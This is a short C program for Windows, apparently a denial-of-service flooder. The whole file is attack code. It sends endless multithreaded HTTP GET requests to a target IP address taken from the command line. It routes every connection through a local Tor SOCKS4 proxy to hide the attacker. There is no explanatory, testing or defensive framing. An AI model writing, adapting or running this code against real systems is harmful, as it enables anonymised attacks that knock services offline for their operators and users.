#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

char *req, *ip;
struct sockaddr_in sa;

struct socks4 {
 char ver;
 char cmd;
 short port;
 unsigned int ip;
 char login[1];
}packed;

DWORD WINAPI ddog() {
	struct WSAData wsadata;
	WSAStartup(MAKEWORD(2,2), &wsadata);
	SOCKET fd = WSASocket(AF_INET, SOCK_STREAM, 0, 0, 0, 0);
	if(WSAConnect(fd, (struct sockaddr *)&sa, sizeof(sa), 0, 0, 0, 0) != -1) {
		write(fd, &packed, sizeof(packed));
		write(fd, req, strlen(req));
		char *resp = malloc(1024);
		read(fd, resp, 1024);
		printf("%s", resp);
		free(resp);
	}
	closesocket(fd);
}

int makereq(char **argv) {
	req = malloc(1024);
	sprintf(req, "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", argv[1]);
}

int main(int argc, char **argv) {
	int i;
	if(argc < 3) {
		printf("ip threads\n");
		return 0;
	}
	packed.ver= 4;
	packed.cmd = 1;
	packed.port = htons(80);
	packed.ip = inet_addr(argv[1]);
    packed.login[0] = 'a'; 
	makereq(argv);
	struct hostent *host; 
	sa.sin_addr.s_addr = inet_addr("127.0.0.1");
	sa.sin_port = htons(9050);
	sa.sin_family = AF_INET;
	HANDLE threads[atoi(argv[2])];
	while(1) {
 	for(i = 0; i < atoi(argv[2]); i++) { 
	 threads[i] = CreateThread(0,0,&ddog, 0, 0, 0);	
	}
	for(i = 0; i < atoi(argv[2]); i++) {
	 WaitForSingleObject(threads[i], 0);
	}
  }
}

